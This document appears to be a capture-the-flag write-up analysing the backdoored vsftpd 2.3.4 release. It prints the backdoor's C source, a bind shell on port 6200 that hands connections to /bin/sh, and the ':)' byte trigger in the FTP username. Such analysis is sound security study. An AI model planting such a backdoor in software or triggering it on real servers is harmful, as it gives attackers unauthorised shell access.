# vsftpd Backdoor (novice - 50 Points)

## Task
An incident, we got alerted that a vsftpd download from the master site (vsftpd-2.3.4.tar.gz) appeared to contain a backdoor
Goal: find the backdoor

Backdoor Version: vsftpd-2.3.4-backdoor.tar.gz

Expected Result:

- please find the backdoor
- explain how you were able to find it
- explain the purpose of the backdoor (what it does)

# Solution

After a little bit of google, I found that this particular vsftpd version really contained a backdoor in the
original version. After looking at the metasploit exploit targeting that version, I start searching in the source-code
for the backdoor. The backdoor function was in the sysdeputil.c file and was essentially this function:

```
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

The function opens the port 6200 and forward the input on the port directly to a shell. So the port accepts
direct shell commands. This function was called in the function "str_contains_space", which is used to check the username.
For this reason, the metasploit module targets it via the FTP username. To trigger the backdoor function, it compares the following:

```
else if((p_str->p_buf[i]==0x3a)
&& (p_str->p_buf[i+1]==0x29))
{
  vsf_sysutil_extra();
}
```

So it basically compares if the input string contains the sequence of 2 particular bytes, 0x3a and 0x29. This this is the case, the backdoor
port gets open and is active.
